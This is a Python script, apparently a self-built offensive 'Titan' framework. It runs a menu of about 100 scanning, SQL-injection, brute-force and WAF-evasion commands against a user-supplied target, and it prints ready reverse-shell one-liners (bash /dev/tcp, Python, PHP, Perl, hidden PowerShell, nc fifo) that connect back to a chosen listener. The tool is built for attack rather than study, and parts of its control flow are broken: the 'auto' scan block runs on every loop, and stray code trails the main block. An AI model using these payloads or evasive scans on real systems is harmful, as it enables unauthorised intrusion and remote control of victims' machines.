import os
import time
import sys
import subprocess
import re
import json
from datetime import datetime

# --- COLORS (ABDUL MATEEN SIGNATURE) ---
R, G, Y, C, M, W, RESET = '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[95m', '\033[97m', '\033[0m'

# --- THE BRAIN: ADVANCED CYBER AI ENGINE ---
import re
import socket
from urllib.parse import urlparse
from datetime import datetime

class CyberAI:
    def __init__(self):
        # 🛡️ LOCAL BLOCK DETECTION & FIREWALL MITIGATION BOUNDS
        self.error_db = {
            r"403 Forbidden|Access Denied": ("IP_BLOCKED", "SHIELD ALERT: Target firewall detected normal signature. Switch your local network connection or adjust delay timing."),
            r"406 Not Acceptable|WAF|Cloudflare|Mod_Security": ("WAF_DETECTED", "WAF PERIMETER TRIGGERED: Active firewall detected. Re-routing commands with padding to bypass application inspection."),
            r"Connection timed out|0 hosts up|Host down|filtered|ignored states": ("HOST_DOWN", "HOST SILENT: Packets are dropped by remote router/firewall ACLs. Target might be blocking standard pings."),
            r"429 Too Many Requests": ("RATE_LIMITED", "RATE LIMIT HIT: Triggered target defensive threshold. Introduce adaptive delays using scan timing parameters.")
        }
        
        # 🟢 AAPKI ORIGINAL SERVICE LOGIC (BINA KISI GAP KE)
        self.service_logic = {
            "21": ("021", "FTP Open: Testing for anonymous access and known vsftpd backdoor signatures."),
            "22": ("012", "SSH Open: Recommending automated credential brute-force audit framework."),
            "23": ("009", "Telnet Open: Unencrypted protocol detected. Suggesting packet sniffing vectors."),
            "25": ("068", "SMTP Open: Probing for user enumeration techniques and open relay vulnerabilities."),
            "53": ("019", "DNS Open: Attempting zone transfer (AXFR) sequences and subdomain discovery."),
            "80": ("031", "HTTP Web Server: Launching advanced directory fuzzing and vulnerability scanning."),
            "110": ("011", "POP3 Open: Auditing for cleartext command execution and password leaks."),
            "139": ("017", "NetBIOS Open: Mapping target network shares and domain configurations."),
            "443": ("054", "HTTPS Server: Initiating complete SSL/TLS cipher audit and certificate chain analysis."),
            "445": ("017", "SMB Open: Verifying critical remote code execution flaws like EternalBlue and SMBGhost."),
            "1433": ("036", "MSSQL Server: Probing for default administrative privileges and SQL injection vectors."),
            "3306": ("020", "MySQL Database: Running automated metadata extraction and root access verification."),
            "3389": ("022", "RDP Protocol: Checking for remote execution flaws like BlueKeep and encryption levels."),
            "5432": ("035", "PostgreSQL Database: Testing for loose authentication trust policies."),
            "8080": ("039", "Alternative HTTP: Inspecting for internal application consoles or deployment managers.")
        }

    def inject_anti_block_arguments(self, command_string):
        """🚀 NATIVE BYPASS ENGINE: Automatically injects evasion flags into Nmap/Web commands"""
        if "nmap" in command_string.lower():
            anti_block_args = " --data-length 100 --spoof-mac Apple --badsum"
            if "-Pn" not in command_string:
                anti_block_args += " -Pn"
            return command_string.replace("nmap", f"nmap{anti_block_args}")
        elif "nikto" in command_string.lower() and "-useragent" not in command_string.lower():
            return command_string.replace("nikto", "nikto -useragent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'")
        return command_string

    def _write_to_target_log(self, target_name, data_text):
        """Dynamic Target Isolation File System Log Manager"""
        # URL parsing standard way se taaki error na aaye
        if not target_name.startswith("http://") and not target_name.startswith("https://"):
            parse_name = "http://" + target_name
        else:
            parse_name = target_name
        try:
            clean_name = urlparse(parse_name).netloc.split(':')[0].rstrip('.')
        except:
            clean_name = "generic_target"
            
        file_filename = f"titan_ai_report_{clean_name}.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(file_filename, "a", encoding="utf-8") as target_file:
            target_file.write(f"\n[{timestamp}] Target Security Analysis Engine Log:\n{data_text}\n")

    def analyze_output(self, output, target_identifier="generic_target"):
        """Live feedback parsing to detect firewall dynamic drops or WAF indicators"""
        for pattern, (err, advice) in self.error_db.items():
            if re.search(pattern, output, re.IGNORECASE):
                print(f"\n{R}[⚠️ SHIELD ALERT] {advice}{RESET}")
                self._write_to_target_log(target_identifier, f"INCIDENT DETECTED: {err} -> {advice}")
                return err, advice
                
        print(f"\n{M}[*] --- TITAN AUTOMATED BUG & RISK EVALUATION REPORT ---{RESET}")
        print(f"{G}[i] System Integrity Bounds Normal: Clear string vectors mapped during this run.{RESET}")
        return None, None

    def get_recommendations(self, nmap_output, target_identifier="generic_target"):
        """Maps discovered ports directly to your internal service matrix modules"""
        suggestions = []
        recon_log = f"=== ACTIVE RECONNAISSANCE FOR TARGET NODE: {target_identifier} ===\n"
        
        port_found = False
        for port, (cmd_num, advice) in self.service_logic.items():
            # Standard string matching checks
            if f"{port}/tcp" in nmap_output or f"{port}/udp" in nmap_output or f"open  {port}" in nmap_output:
                status = f"[+] [AI SUGGESTION] Port ({port}) is OPEN! -> {advice}"
                print(f"\n{G}{status}{RESET}")
                recon_log += status + "\n"
                suggestions.append(cmd_num)
                port_found = True
                
        if not port_found:
            no_port_msg = "[i] No standard open ports detected in the initial quick scan. Host might be protected by a strict stateful firewall."
            print(f"\n{Y}{no_port_msg}{RESET}")
            recon_log += no_port_msg + "\n"
            
        self._write_to_target_log(target_identifier, recon_log)
        return suggestions
class PayloadLab:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def get_bash(self):
        return f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"

    def get_python(self):
        return f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"

    def get_php(self):
        return f"php -r '$sock=fsockopen(\"{self.lhost}\",{self.lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    def get_perl(self):
        return f"perl -e 'use Socket;$i=\"{self.lhost}\";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"

    def get_powershell(self):
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{self.lhost}\",{self.lport});"

    def get_nc(self):
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f"

# --- ADVANCED FRAMEWORK MODULE 2: WEB TITAN AUDITOR ---
class WebTitan:
    def __init__(self, target):
        self.target = target

    def run_recon(self):
        print(f"\n{C}[*] Triggering Automated Web Technology Profiling...{RESET}")
        os.system(f"whatweb -a 3 {self.target}")
        
    def run_waf_check(self):
        print(f"\n{C}[*] Probing Web Application Firewall Infrastructure...{RESET}")
        os.system(f"wafw00f {self.target}")

    def run_directories(self):
        print(f"\n{C}[*] Starting Dictionary-Based Path Discovery...{RESET}")
        os.system(f"dirb http://{self.target} -f")

    def run_vulnerabilities(self):
        print(f"\n{C}[*] Initiating Full-Scale Nikto Core Scanning...{RESET}")
        os.system(f"nikto -h {self.target} -Tuning 1234589")

# --- ADVANCED FRAMEWORK MODULE 3: AUTOMATED REPORT EXTRACTOR ---
class ReportManager:
    def __init__(self, target):
        self.target = target
        
        # URL Filter: Taaki file name mein 'https://' ya '/' na aaye
        clean_name = target.replace("https://", "").replace("http://", "").replace("/", "_").replace(":", "_").replace(".", "_")
        
        self.filename = f"titan_report_{clean_name}.json"
        self.log_file = f"titan_history_{clean_name}.txt"
        
        # ⏰ Pakka Ilaaj: Direct datetime.now() bina kisi crash ke
        self.report_structure = {
            "target_host": target, 
            "generated_at": str(datetime.now()), 
            "vulnerability_records": []
        }

    def append_scan_record(self, execution_cmd, raw_output):
        # ⏰ Direct datetime.now() use kiya hai bina extra prefix ke
        self.report_structure["vulnerability_records"].append({
            "timestamp": str(datetime.now()),
            "executed_command": execution_cmd,
            "data_summary": raw_output[:1000]
        })
        
        with open(self.log_file, "a") as txt_f:
            txt_f.write(f"\n--- SCAN TIME: {str(datetime.now())} --- \nCMD: {execution_cmd}\nOUTPUT:\n{raw_output}\n")

    def write_json_to_disk(self):
        with open(self.filename, 'w') as json_f:
            json.dump(self.report_structure, json_f, indent=4)
        print(f"{G}[+] Structure saved to JSON Database: {self.filename}{RESET}")
        print(f"{G}[+] Full log logs pushed to Text History: {self.log_file}{RESET}")
# --- THE 100 COMMANDS MONOLITHIC DATABASE ---
cmd_list = {
    "1": ("nmap -sS -Pn {t}", "Stealth SYN Scan: Executes half-open connection probing without completing handshakes."),
    "2": ("nmap -sV --version-intensity 9 {t}", "Advanced Version Detection: Aggressive probe intensity for service verification."),
    "3": ("nmap -O --osscan-guess {t}", "OS Fingerprinting: Forces TCP/IP stack analysis to deduce remote operating system flavor."),
    "4": ("nmap -f -mtu 8 {t}", "Packet Fragmentation: Splits header sectors into 8-byte fragments to trick basic firewalls."),
    "5": ("nmap -D RND:20 {t}", "Decoy Scanning: Blends the genuine scanning IP address within 20 randomized source decoys."),
    "6": ("nmap --data-length 128 {t}", "Packet Padding: appends arbitrary data to packets to alter common structural patterns."),
    "7": ("nmap --source-port 53 {t}", "Source Port Spoofing: Alters outgoing connection port to 53 to simulate standard DNS replies."),
    "8": ("nmap --badsum {t}", "Checksum Manipulation: Transmits invalid checksum signatures to identify defensive stateful monitors."),
    "9": ("nmap --script vuln {t}", "Vulnerability Evaluation: Invokes the Nmap Scripting Engine to detect critical public CVEs."),
    "10": ("nmap -p- -T4 {t}", "Full Port Coverage: Evaluates all 65,535 possible communication lines at high acceleration speeds."),
    "11": ("nmap --script auth {t}", "Authentication Probe: Automatically checks for unsecured or empty administrative accounts."),
    "12": ("nmap --script brute {t}", "Brute Force Discovery: Runs basic dictionary guesses against common active protocols."),
    "13": ("nmap --script default,safe {t}", "Safe Reconnaissance: Gathers comprehensive technical operational details without service disruption."),
    "14": ("nmap --spoof-mac Apple {t}", "MAC Address Spoofing: Overrides local network card identity to resemble an official Apple node."),
    "15": ("nmap -sU -p 53,67,123,161 {t}", "UDP Service Scan: Directly maps connection profiles of core stateless UDP applications."),
    "16": ("nmap --script http-enum {t}", "Web Directory Enumeration: Probes web applications for known exposed backup paths."),
    "17": ("nmap --script smb-vuln* {t}", "SMB Exploit Verification: Searches for critical high-impact network vulnerabilities like EternalBlue."),
    "18": ("nmap --script ssl-enum-ciphers {t}", "SSL/TLS Cipher Audit: Collects cipher suites to verify weak protocol execution configurations."),
    "19": ("nmap --script dns-brute {t}", "DNS Subdomain Discovery: Performs high-speed namespace dictionary guessing loops."),
    "20": ("nmap --script mysql-info {t}", "MySQL Reconnaissance: Extractions operational versions and remote system privileges."),
    "21": ("nmap --script ftp-anon {t}", "FTP Anonymous Validation: Tests whether target allows password-less file access entry points."),
    "22": ("nmap --script rdp-enum-encryption {t}", "RDP Analysis: Discovers Remote Desktop security configuration and protocol dependencies."),
    "23": ("nmap -T1 -sS {t}", "Paranoid Stealth Scanning: Injects extreme microsecond gaps to render scans invisible to IDSs."),
    "24": ("nmap --script http-waf-detect {t}", "WAF Fingerprinting: Identifies protective firewalls like Cloudflare or ModSecurity."),
    "25": ("nmap --script http-robots.txt {t}", "Robots Scraper: Extracts directives and restricted paths hidden inside configuration text files."),
    "26": ("nmap --script snmp-brute {t}", "SNMP String Guessing: Runs automated common word verification against SNMP endpoints."),
    "27": ("nmap --script vnc-info {t}", "VNC Access Verification: Assesses exposed remote systems utilizing virtualization desktop layouts."),
    "28": ("nmap --script whois-domain {t}", "Whois Intelligence Mining: References structural ownership records directly via public databases."),
    "29": ("nmap --script http-methods {t}", "HTTP Verb Audit: Validates if unsafe methods like PUT, DELETE, or TRACE are active."),
    "30": ("nmap -sT -Pn {t}", "Full TCP Connect Scan: Completes standard 3-way handshakes for maximum accuracy tracking."),
    "31": ("nikto -h {t}", "Web Server Audit: Inspects standard web deployments for thousands of outdated configuration items."),
    "32": ("nikto -h {t} -Tuning 4", "SQL Injection Tuning: Directs the vulnerability scanning system to focus strictly on injection forms."),
    "33": ("nikto -h {t} -evasion 1", "WAF Evasion Logic: Encodes baseline payload parameters using basic randomized URI conversions."),
    "34": ("sqlmap -u {t} --batch --crawl=2", "Automated SQLi Discovery: Automatically navigates local interfaces seeking entry parameters."),
    "35": ("sqlmap -u {t} --dbs", "Database Schema Enumeration: Extracts visible structural catalog terms from the endpoint."),
    "36": ("sqlmap -u {t} --level=5 --risk=3", "Maximum SQLi Aggression: Executes comprehensive data payload mutations for hard targets."),
    "37": ("ghauri -u {t} --batch --dbs", "Fast SQLi Recon: Runs highly-optimized database structural extraction workflows."),
    "38": ("wafw00f {t} -a", "Aggressive WAF Identification: Profiles underlying protective proxy infrastructure styles."),
    "39": ("whatweb -a 3 {t}", "Technology Profiling: Aggressively checks software application frameworks and active library blocks."),
    "40": ("dirsearch -u {t} -e php,txt,zip,conf,sql,bak", "Hidden File Hunting: Discovers common compressed archives on target web servers."),
    "41": ("ffuf -u {t}/FUZZ -w list.txt -mc 200", "High-Speed Fuzzing: Uses wordlists to brute-force web application input structures."),
    "42": ("gobuster dir -u {t} -w list.txt -t 50", "Multi-Threaded Brute-Force: Executes concurrent path evaluation threads at accelerated speeds."),
    "43": ("arjun -u {t} -m GET", "Hidden Parameter Discovery: Isolates undocumented variables within web submission parameters."),
    "44": ("paramspider -d {t} --level high", "Parameter Mining: Harvests historic parameters compiled from long-term public internet archives."),
    "45": ("xsstrike -u {t} --crawl", "XSS Warfare: Evaluates user reflection parameters with deep contextual checking automation."),
    "46": ("wpscan --url {t} --enumerate vp,vt", "WordPress Audit: Discovers vulnerable plugins or theme elements on target blogs."),
    "47": ("joomscan -u {t}", "Joomla Vulnerability Scan: Executes environment auditing specific to Joomla installations."),
    "48": ("droopescan scan drupal -u {t}", "Drupal Analysis: Looks for outdated module states and core execution anomalies."),
    "49": ("commix --url {t} --batch", "Command Injection Scanner: Automates OS command injection payload delivery checks."),
    "50": ("subfinder -d {t} -silent", "Subdomain Reconnaissance: Queries multiple cloud engines for structural address lists."),
    "51": ("amass enum -d {t}", "Active Domain Mapping: Gathers infrastructure asset connections through complex DNS tracking."),
    "52": ("assetfinder --subs-only {t}", "Asset Extraction: Compiles subdomain data directly from historic certificate logs."),
    "53": ("sublist3r -d {t} -e google,bing,yahoo", "Search Engine Recon: Scrapes search indices for forgotten subdomain references."),
    "54": ("sslscan --show-certificate {t}", "SSL/TLS Security Audit: Evaluates outdated protocols like POODLE and Heartbleed vulnerabilities."),
    "55": ("photon -u {t} -l 3", "Data Crawling: Recursively parses application files to pull emails, files, and endpoints."),
    "56": ("theharvester -d {t} -b all", "OSINT Data Collection: Harvests names, emails, and linked hosts from public indexes."),
    "57": ("dnsrecon -d {t} -t axfr", "DNS Zone Transfer: Attempts full database duplication routines from target name servers."),
    "58": ("cloudflair -d {t}", "Cloudflare Bypass: Attempts to map genuine source coordinates using legacy database historical records."),
    "59": ("uniscan -u {t} -qw", "Web LFI/RFI/RCE Scanner: Evaluates path manipulation bugs within application code lines."),
    "60": ("davtest -url {t}", "WebDAV Exploit Verification: Attempts file uploads to check for authorization misconfigurations."),
    "61": ("nmap -sS -f --mtu 16 --data-length 100 {t}", "Ghost Stealth Mode: Bundles fragmentation, specific size offsets, and data padding."),
    "62": ("nmap --script http-shellshock {t}", "Shellshock Check: Probes legacy CGI handling scripts for systemic environmental vulnerability."),
    "63": ("nmap --script http-git {t}", "Exposed Git Repository Check: Checks for unsecure source control folders exposed on web assets."),
    "64": ("nmap --script http-internal-ip-disclosure {t}", "Internal IP Leak Check: Forces web proxies to reveal system address configurations."),
    "65": ("nmap --script http-backup-finder {t}", "Sensitive Backup Discovery: Checks for forgotten configuration copies inside production roots."),
    "66": ("nmap --script http-wordpress-enum {t}", "WordPress User Discovery: Maps valid author identities using default endpoint paths."),
    "67": ("nmap --script snmp-sysdescr {t}", "SNMP Information Leak: Pulls system specifications via unsecured open public strings."),
    "68": ("nmap --script smtp-commands {t}", "SMTP Command Capability Audit: Evaluates internal user account tracking commands like VRFY."),
    "69": ("nmap --script rdp-vuln-ms12-020 {t}", "Legacy RDP Check: Verifies existence of outdated memory management denial of service flaws."),
    "70": ("nmap --script ftp-vsftpd-backdoor {t}", "FTP Backdoor Check: Looks for signature markers matching compromised historical code blocks."),
    "71": ("dirb {t} -X .php,.sql", "Targeted Content Brute-Force: Searches specifically for raw database drops and scripts."),
    "72": ("uniscan -u {t} -d", "Directory Recon: Looks for misconfigured text logs and configuration listings."),
    "73": ("clusterd -i {t}", "Application Server Recon: Probes middleware technologies like JBoss or WebLogic frameworks."),
    "74": ("cadaver {t}", "WebDAV Shell Access: Direct manual file system management interface over active folders."),
    "75": ("fierce --domain {t}", "Recursive DNS Discovery: Looks for hidden records using specialized non-contiguous checks."),
    "76": ("hping3 -S -p 80 -c 1 {t}", "Custom TCP Rule Probing: Manual packet generation to test firewall state rules."),
    "77": ("fping -g {t}", "Fast Host Discovery Suite: Pings entire network blocks in parallel for rapid host scanning."),
    "78": ("netdiscover -r {t}", "ARP Network Mapping: Actively maps standard network endpoints over raw local ARP loops."),
    "79": ("masscan -p1-1000 {t} --rate=1000", "Hyper-Fast Port Scan: Transmits raw connection checks at extreme multi-threaded scales."),
    "80": ("webtech -u {t}", "Tech Stack ID: Resolves framework software components through active header tracking."),
    "81": ("crlfsuite -u {t}", "CRLF Injection Audit: Evaluates carriage return bugs capable of log tampering."),
    "82": ("dalfox url {t}", "DOM XSS Fuzzing Engine: Evaluates dynamic input variables in runtime scripts."),
    "83": ("gau {t} | grep '.js'", "JS Endpoint Miner: Downloads compiled JavaScript files to parse internal development keys."),
    "84": ("waybackurls {t} | grep '.php'", "Wayback Recovery: Pulls dead historical server paths from archives to identify active lines."),
    "85": ("shodan host {t}", "Shodan Intelligence Query: Pulls pre-scanned infrastructure threat intelligence records via external API."),
    "86": ("recon-ng", "OSINT Framework Shell: Launches interactive workspace containing modular open intelligence assets."),
    "87": ("sslscan --tlsall {t}", "TLS Version Audit: Forces target server to declare support for historical protocol states."),
    "88": ("smbmap -H {t}", "SMB Share Permissions: Maps visibility states and access access modes across shares."),
    "89": ("enum4linux {t}", "Windows Recon Extraction: Pulls system operational parameters directly via legacy RPC connections."),
    "90": ("nmap -sV -sC -p 445 {t}", "SMB Safe Scripting: Gathers standard properties using non-destructive security checks."),
    "91": ("nmap --script broadcast-dns-service-discovery {t}", "mDNS Local Discovery: Maps local assets via zero-configuration local broadcasts."),
    "92": ("nmap --script http-svn-info {t}", "SVN Metadata Leak Hunter: Pulls code revision control files to recover team operations."),
    "93": ("nmap --script http-headers {t}", "Security Header Audit: Checks for implementation failure across defensive parameters."),
    "94": ("nmap --script banner {t}", "Banner Grabbing Suite: Pulls raw welcoming characters to extract component builds."),
    "95": ("nmap -Pn -sS -T4 --open {t}", "Active Port Listing Only: Limits reporting visibility solely to confirmed operational channels."),
    "96": ("nmap --script dns-brute --threads 10 {t}", "Multi-threaded DNS Search: Maximizes processing power across structural domain loops."),
    "97": ("nmap --script http-vlc-streamer-info {t}", "IoT Media Feed Search: Identifies open unauthenticated media distribution points."),
    "98": ("nmap --script memcached-info {t}", "Memcached Data Audit: Validates if cached memory storage buffers can be queried directly."),
    "99": ("nmap --script redis-info {t}", "Redis Access Probe: Checks for unauthenticated instance access over production key databases."),
   "100": ("nmap -p- --script vuln,safe,discovery {t}", "FINAL TITAN BOSS MODE: Executes comprehensive long-term target system auditing workflows.")
}
# --- THE EXECUTIVE SYSTEM ENGINE ---
def show_header():
    os.system('clear')
    banner = f"""
    {G} █████╗ ██████╗ ██████╗ ██╗   ██╗██╗         ███╗   ███╗ █████╗ ████████╗███████╗███████╗███╗   ██╗
    {G}██╔══██╗██╔══██╗██╔══██╗██║   ██║██║         ████╗ ████║██╔══██╗╚══██╔══╝██╔════╝██╔════╝████╗  ██║
    {W}███████║██████╔╝██║  ██║██║   ██║██║         ██╔████╔██║███████║   ██║   █████╗  █████╗  ██╔██╗ ██║
    {W}██╔══██║██╔══██╗██║  ██║██║   ██║██║         ██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  ██╔══╝  ██║╚██╗██║
    {R}██║  ██║██████╔╝██████╔╝╚██████╔╝███████╗    ██║ ╚═╝ ██║██║  ██║   ██║   ███████╗███████╗██║ ╚████║
    {R}╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝
    {C}                       [ TITAN SECURITY RESEARCH SUITE v52.0 - DIRECT ATTACK ]
    """
    print(banner)
    print(f"{M}" + "="*105 + f"{RESET}")

def report_status(message, mode="INFO"):
    timestamp = time.strftime("%H:%M:%S")
    if mode == "INFO":
        print(f"{C}[{timestamp}] [INFO] {message}{RESET}")
    elif mode == "ERR":
        print(f"{R}[{timestamp}] [ERROR] {message}{RESET}")
    elif mode == "SUC":
        print(f"{G}[{timestamp}] [SUCCESS] {message}{RESET}")

def run_command_sequence(command, reference_detail):
    report_status(f"Initiating Target Subsystem Probing Sequence...", "INFO")
    print(f"{W}Action Profile: {reference_detail}{RESET}")
    print(f"{Y}Executing String: {command}{RESET}")
    print(f"{M}" + "-"*75 + f"{RESET}")
    
    try:
        execution_handle = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        captured_buffer = ""
        for processing_line in execution_handle.stdout:
            print(f"{W}{processing_line}{RESET}", end="")
            captured_buffer += processing_line
        execution_handle.wait()
        return captured_buffer
    except Exception as hardware_exception:
        report_status(f"System Command Execution Protocol Failure: {hardware_exception}", "ERR")
        return ""

def process_payload_subroutine():
    show_header()
    print(f"{C}--- TITAN REVERSE SHELL INTERACTIVE PLAYGROUND ---{RESET}\n")
    lhost = input(f"{W}Specify Listener Host Configuration (LHOST): {RESET}").strip()
    lport = input(f"{W}Specify Listener Port Configuration (LPORT): {RESET}").strip()
    
    if not lhost or not lport:
        report_status("Parameter registration error. Aborting template deployment.", "ERR")
        return
        
    lab_handle = PayloadLab(lhost, lport)
    print(f"\n{M}" + "-"*60)
    print(f"{G}[+] BASH PAYLOAD:\n{W}{lab_handle.get_bash()}{RESET}\n")
    print(f"{G}[+] PYTHON DESCRIPTOR:\n{W}{lab_handle.get_python()}{RESET}\n")
    print(f"{G}[+] PHP PAYLOAD EXEC:\n{W}{lab_handle.get_php()}{RESET}\n")
    print(f"{G}[+] PERL TEMPLATE:\n{W}{lab_handle.get_perl()}{RESET}\n")
    print(f"{G}[+] POWERSHELL BYPASS:\n{W}{lab_handle.get_powershell()}{RESET}\n")
    print(f"{G}[+] NC FIFO STACK:\n{W}{lab_handle.get_nc()}{RESET}")
    print(f"{M}" + "-"*60)

def main_orchestration_loop(target_identifier):
    ai_engine = CyberAI()
    auditor_instance = WebTitan(target_identifier)
    reporter_instance = ReportManager(target_identifier)
    
    while True:
        show_header()
        print(f"{C}TARGET IP/DOMAIN: {target_identifier} | NETWORK MODE: DIRECT CONNECTION | RADAR: ON{RESET}")
        print(f"{Y}UTILITIES: [001-100] Commands | [auto] AI Discovery | [web] Deep Web Audit | [payload] Reverse Shells | [0] Exit{RESET}\n")
# --- FIXED DISPLAY ENGINE (100% PERFECT) ---
        print(f"{M}" + "="*110 + f"{RESET}")
        print(f"{C}{'OPTION':<8}{'EXECUTION FRAMEWORK & FULL METADATA PROFILES':<75}{'CORE TOOL'}{RESET}")
        print(f"{M}" + "="*110 + f"{RESET}")

        for string_key, (command_template, details_string) in cmd_list.items():
            tool_name = command_template.split()[0].upper()
            print(f"[{G}{string_key.zfill(3)}{RESET}]  {W}{details_string:<75}{RESET} -> [{Y}{tool_name}{RESET}]")

        print(f"{M}" + "="*110 + f"{RESET}") 

        user_input_choice = input(f"\n\n{M}[ABDUL-MATEEN@TITAN-ROOT]# {RESET}").strip().lower()

        if user_input_choice == '0':
            reporter_instance.write_json_to_disk()
            report_status("Titan Framework operational lifecycle terminated safely.", "SUC")
            break
        if user_input_choice == 'auto':
             import socket
        from urllib.parse import urlparse

        report_status("Launching automated surface map routine...", "INFO")
        
        # 🌐 URL Cleaner Matrix: Full link se domain alag karne ke liye
        if not target_identifier.startswith("http://") and not target_identifier.startswith("https://"):
            parse_input = "http://" + target_identifier
        else:
            parse_input = target_identifier

        try:
            parsed_url = urlparse(parse_input)
            clean_domain = parsed_url.netloc.split(':')[0].rstrip('.')
            print(f"\n{C}[*] Resolving Target Identity: {W}{clean_domain}{RESET}")
            
            # Auto IP Address Fetcher
            resolved_ip = socket.gethostbyname(clean_domain)
            print(f"{G}[+] Target Server IP Address Mapped: {Y}{resolved_ip}{RESET}\n")
        except Exception:
            resolved_ip = target_identifier
            clean_domain = target_identifier

        # 🛡️ Firewall Stealth Evasion Parameters
        base_recon_data = subprocess.getoutput(f"nmap -F -Pn --open --data-length 100 {resolved_ip}")
        print(f"{W}{base_recon_data}{RESET}")
        
        # AI Processing Flow
        evaluated_tips = ai_engine.get_recommendations(base_recon_data, clean_domain)

        # 📊 Output Handler Matrix
        if evaluated_tips:
            print(f"\n{C}--- AI ARCHITECT STRUCTURAL RECOMMENDATIONS ---{RESET}")
            for tracking_tip in evaluated_tips:
                print(tracking_tip)
        else:
            report_status("AI Engine parsed execution patterns but found no obvious entry vectors.", "ERR")
            
        input(f"\n{Y}Press Enter to safely cycle back to the dashboard...{RESET}")
        if user_input_choice == 'web':
            auditor_instance.run_recon()
            auditor_instance.run_waf_check()
            auditor_instance.run_directories()
            auditor_instance.run_vulnerabilities()
            input(f"\n{Y}Target website parsing finished. Press Enter to return...{RESET}")
            continue

        if user_input_choice == 'payload':
            process_payload_subroutine()
            input(f"\n{Y}Template export complete. Press Enter to return...{RESET}")
            continue

        if user_input_choice in cmd_list:
            command_template_string, details_string = cmd_list[user_input_choice]
            final_executable_command = command_template_string.replace("{t}", target_identifier)
            
            raw_execution_output = run_command_sequence(final_executable_command, details_string)
            reporter_instance.append_scan_record(final_executable_command, raw_execution_output)
            
            detected_error, remedial_advice = ai_engine.analyze_output(raw_execution_output)
            if detected_error:
                report_status(f"SECURITY THREAT BLOCKED: {detected_error} -> {remedial_advice}", "ERR")
            else:
                report_status("Target transaction sequence closed successfully without protocol flags.", "SUC")
            
            input(f"\n{Y}Operational frame complete. Press Enter to safely cycle back to the dashboard...{RESET}")
        else:
            report_status("Invalid selection profile matrix. Choose standard operational bounds.", "ERR")
            time.sleep(1)

if __name__ == "__main__":
    if os.getuid() != 0:
        print(f"{R}[!] CRITICAL ACCESS ERROR: Titan Core architecture mandates local ROOT privileges for raw socket framing.{RESET}")
        sys.exit(1)

    show_header()
    runtime_host_argument = input(f"{W}Provide Target Destination Coordinates (IP / Namespace Domain): {RESET}").strip()
    if runtime_host_argument:
        try:
            main_orchestration_loop(runtime_host_argument)
        except KeyboardInterrupt:
            print(f"\n{R}[!] CRITICAL INTERRUPT: Manual runtime abort received. Closing operational threads.{RESET}")
    else:
        print(f"{R}[!] PROCESSING FAILURE: Initialization parameter empty. Aborting run.{RESET}")
        import random

def get_stealth_headers():
    """Generates random browser identity signatures to bypass web firewall blocks."""
    user_agents = [
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }
def save_titan_session_log(target, module_name, scan_output):
    """Saves every scan result live into a log file so you never lose data if Kali terminal closes."""
    import time
    try:
        log_dir = "titan_framework_logs"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
            
        file_path = os.path.join(log_dir, f"session_{target}.txt")
        current_time = time.strftime("%Y-%m-%d %H:%M:%S")
        
        with open(file_path, "a", encoding="utf-8") as log_file:
            log_file.write(f"\n================ [{current_time}] MODULE: {module_name} ================\n")
            log_file.write(scan_output)
            log_file.write("\n======================================================================\n")
    except Exception as e:
        print(f"[!] Logging Error: {str(e)}")
      